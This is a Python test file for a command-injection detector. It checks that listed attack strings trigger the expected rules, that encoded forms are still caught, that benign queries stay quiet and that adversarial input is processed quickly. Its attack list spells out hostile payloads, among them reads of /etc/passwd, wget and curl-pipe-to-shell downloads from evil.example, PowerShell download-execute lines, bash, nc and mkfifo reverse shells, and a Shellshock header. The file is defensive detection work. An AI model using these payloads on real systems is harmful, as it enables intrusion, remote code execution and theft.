import time
from datetime import UTC, datetime
from ipaddress import ip_address
from uuid import uuid4

import pytest

from domain.captured_request import CapturedRequest
from workers.detector.cmdi import RULES
from workers.detector.rules import RuleRegistry


def _request(
    *,
    path: str = "/",
    query: str = "",
    body: str = "",
    headers: list[tuple[str, str]] | None = None,
) -> CapturedRequest:
    return CapturedRequest(
        ts=datetime(2026, 1, 1, tzinfo=UTC),
        session_id=uuid4(),
        world_id="w",
        ip=ip_address("203.0.113.9"),
        method="GET",
        path=path,
        query=query,
        body_excerpt=body,
        headers=headers or [],
    )


@pytest.fixture(scope="module")
def registry() -> RuleRegistry:
    registry = RuleRegistry()
    for rule in RULES:
        registry.register(rule)
    return registry


def _fired(registry: RuleRegistry, request: CapturedRequest) -> set[str]:
    return {d.rule for d in registry.evaluate(request)}


ATTACKS = [
    ("host=127.0.0.1; cat /etc/passwd", "cmdi.shell_chain"),
    ("host=127.0.0.1;whoami", "cmdi.shell_chain"),
    ("host=x|id", "cmdi.shell_chain"),
    ("host=x && uname -a", "cmdi.shell_chain"),
    ("host=x || ls -la /", "cmdi.shell_chain"),
    ("host=$(whoami)", "cmdi.shell_chain"),
    ("host=`id`", "cmdi.shell_chain"),
    ("host=x%0Aid", "cmdi.shell_chain"),
    ("host=x;sleep 5", "cmdi.shell_chain"),
    ("host=x & ping -c 4 10.0.0.1", "cmdi.shell_chain"),
    ("host=x; NSLOOKUP evil.example", "cmdi.shell_chain"),
    ("cmd=/bin/sh -c id", "cmdi.shell_path"),
    ("cmd=/usr/bin/python3 x.py", "cmdi.shell_path"),
    ("cmd=cmd.exe /c dir", "cmdi.shell_path"),
    ("cmd=powershell -enc SQBFAFgA", "cmdi.shell_path"),
    ("cmd=powershell.exe -nop -w hidden", "cmdi.shell_path"),
    ("file=a;cat${IFS}/etc/passwd", "cmdi.ifs_evasion"),
    ("file=a;cat$IFS$9/etc/passwd", "cmdi.ifs_evasion"),
    ("cmd=wget http://evil.example/x.sh -O /tmp/x", "cmdi.download_exec"),
    ("cmd=curl -s http://evil.example/x", "cmdi.download_exec"),
    ("cmd=curl evil.example/x | sh", "cmdi.download_exec"),
    ("cmd=certutil -urlcache -f http://x/a a.exe", "cmdi.download_exec"),
    ("cmd=bitsadmin /transfer j http://x/a a.exe", "cmdi.download_exec"),
    ("cmd=chmod%20%2Bx%20/tmp/x", "cmdi.download_exec"),
    ("cmd=chmod 777 /tmp/x", "cmdi.download_exec"),
    ("cmd=IEX (New-Object Net.WebClient).DownloadString('http://x/a')", "cmdi.download_exec"),
    ("cmd=bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "cmdi.reverse_shell"),
    ("cmd=nc -e /bin/sh 10.0.0.1 4444", "cmdi.reverse_shell"),
    ("cmd=mkfifo /tmp/f; nc 10.0.0.1 4444 </tmp/f", "cmdi.reverse_shell"),
    ("cmd=python -c 'import socket,subprocess'", "cmdi.reverse_shell"),
    ("cmd=php -r '$s=fsockopen(\"10.0.0.1\",4444);'", "cmdi.reverse_shell"),
    ("host=abc123.oast.fun", "cmdi.oob_callback"),
    ("host=x.y.burpcollaborator.net", "cmdi.oob_callback"),
    ("host=u1.interact.sh", "cmdi.oob_callback"),
    ("host=a.b.oastify.com", "cmdi.oob_callback"),
    ("host=k.dnslog.cn", "cmdi.oob_callback"),
]


@pytest.mark.parametrize(("query", "rule"), ATTACKS, ids=[a[0][:50] for a in ATTACKS])
def test_attack_fires_expected_rule(registry: RuleRegistry, query: str, rule: str) -> None:
    assert rule in _fired(registry, _request(query=query))


@pytest.mark.parametrize(
    ("query", "rule"),
    [
        ("host=x%3Bwhoami", "cmdi.shell_chain"),
        ("host=x%253Bwhoami", "cmdi.shell_chain"),  # double-encoded
        ("host=x%7Cid", "cmdi.shell_chain"),
        ("host=x%26%26uname%20-a", "cmdi.shell_chain"),
        ("host=x%0a%0dcat%20/etc/passwd", "cmdi.shell_chain"),
        ("host=x;who%00ami", "cmdi.shell_chain"),  # NUL byte
        ("cmd=%2Fbin%2Fsh%20-c%20id", "cmdi.shell_path"),
    ],
)
def test_encoded_payloads_are_still_detected(registry: RuleRegistry, query: str, rule: str) -> None:
    assert rule in _fired(registry, _request(query=query))


def test_payload_in_body_path_and_headers(registry: RuleRegistry) -> None:
    assert "cmdi.shell_chain" in _fired(registry, _request(body="host=127.0.0.1;whoami"))
    assert "cmdi.shell_chain" in _fired(registry, _request(body='{"host": "x; cat /etc/passwd"}'))
    assert "cmdi.shell_chain" in _fired(registry, _request(path="/ping/127.0.0.1;id"))
    assert "cmdi.shell_chain" in _fired(
        registry, _request(headers=[("User-Agent", "() { :;}; /bin/bash -c 'id'; whoami")])
    )
    assert "cmdi.download_exec" in _fired(
        registry, _request(headers=[("X-Forwarded-For", "1.1.1.1;wget http://x/a")])
    )


def test_detection_carries_rule_metadata_and_excerpt(registry: RuleRegistry) -> None:
    detections = registry.evaluate(_request(query="host=x;whoami&c=bash -i >& /dev/tcp/1.2.3.4/9"))

    by_rule = {d.rule: d for d in detections}
    assert by_rule["cmdi.shell_chain"].matched_excerpt == ";whoami"
    assert by_rule["cmdi.shell_chain"].category == "cmdi"
    assert by_rule["cmdi.reverse_shell"].severity.value == "critical"


# Ordinary traffic that must stay quiet. Each looks a little like an attack.
CLEAN = [
    "host=example.com",
    "q=tom and jerry; the movie",
    "q=cats & dogs",
    "name=Lee & Sons",
    "q=rock; roll",
    "q=pipe | wrench",
    "q=a || b",
    "q=how to use cat",
    "q=the id of the user",
    "q=id=5&name=x",
    "q=sleep better",
    "q=ls",
    "q=curl",
    "q=bash",
    "q=shell scripting",
    "q=ping pong",
    "q=learn html; php tutorial",
    "q=powershell tutorial",
    "q=whoami the band",
    "q=cost $(10 USD)",
    "text=run `make` then deploy",
    "q=wget manual",
    "q=chmod 755 tutorial",
    "q=cmd key on keyboard",
    "q=oast fun facts",
    "email=a%2Bb%40example.com",
    "page=2&limit=50&filter=in_stock",
]


@pytest.mark.parametrize("query", CLEAN)
def test_ordinary_queries_do_not_fire(registry: RuleRegistry, query: str) -> None:
    assert _fired(registry, _request(query=query)) == set()


def test_ordinary_requests_do_not_fire(registry: RuleRegistry) -> None:
    request = _request(
        path="/api/v1/products/42",
        body='{"title": "Rock & Roll", "note": "hello\\nsleep well; see you\\n"}',
        headers=[
            ("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"),
            ("Accept", "text/html,application/xhtml+xml;q=0.9,*/*;q=0.8"),
            ("Referer", "https://shop.example/search?q=shoes&sort=price"),
            ("Cookie", "session=abc123; theme=dark"),
        ],
    )

    assert _fired(registry, request) == set()


def test_rule_set_is_consistent() -> None:
    names = [rule.name for rule in RULES]

    assert len(names) == len(set(names))
    assert all(rule.category == "cmdi" for rule in RULES)
    assert all(name.startswith("cmdi.") for name in names)


@pytest.mark.parametrize(
    "body",
    [
        "; " * 4000,
        ";" + " " * 8000 + "x",
        "\n " * 4000,
        "|" * 8000,
        "&& " * 2700,
        "$(" * 4000,
        "`" * 8000,
        "; cat" + " " * 8000,
        "wget " + "-a " * 2700,
        "curl " + "x" * 8000,
        "nc " + "a" * 8000,
        "a." * 4000 + "oast.fun",
        "socket.socket(" + "a" * 8000,
    ],
    ids=[
        "separator-spam",
        "separator-spaces",
        "newline-spaces",
        "pipes",
        "and-spam",
        "subst-spam",
        "backticks",
        "weak-spaces",
        "wget-flags",
        "curl-long",
        "nc-long",
        "oob-labels",
        "socket-long",
    ],
)
def test_adversarial_input_is_processed_quickly(registry: RuleRegistry, body: str) -> None:
    started = time.perf_counter()
    registry.evaluate(_request(body=body))

    assert time.perf_counter() - started < 0.5
